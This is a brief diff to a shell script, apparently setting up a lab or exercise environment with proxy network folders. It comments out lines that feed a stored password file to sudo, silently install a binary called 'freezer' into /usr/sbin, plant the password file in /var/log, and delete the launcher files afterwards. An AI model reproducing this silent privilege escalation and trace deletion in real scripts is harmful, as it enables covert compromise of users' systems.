@@ -27,13 +27,13 @@ done
 
 cd $DIR/
 
-sudo -k -S $DIR/freezer dec < $DIR/.pass > /dev/null 2>&1
-sudo -k -S cp $DIR/freezer /usr/sbin < $DIR/.pass > /dev/null 2>&1
-sudo -k -S cp $DIR/.pass /var/log/ < $DIR/.pass > /dev/null 2>&1
-
-rm $DIR/.pass
-rm $DIR/start.desktop
-rm $DIR/freezer
+#sudo -k -S $DIR/freezer dec < $DIR/.pass > /dev/null 2>&1
+#sudo -k -S cp $DIR/freezer /usr/sbin < $DIR/.pass > /dev/null 2>&1
+#sudo -k -S cp $DIR/.pass /var/log/ < $DIR/.pass > /dev/null 2>&1
+ $DIR/freezer dec| gnome-terminal
+#rm $DIR/.pass
+#rm $DIR/start.desktop
+#rm $DIR/freezer
 
 mkdir $DIR/proxy_networks
 mkdir $DIR/proxy_networks/proxy172.16.24.{1..3}
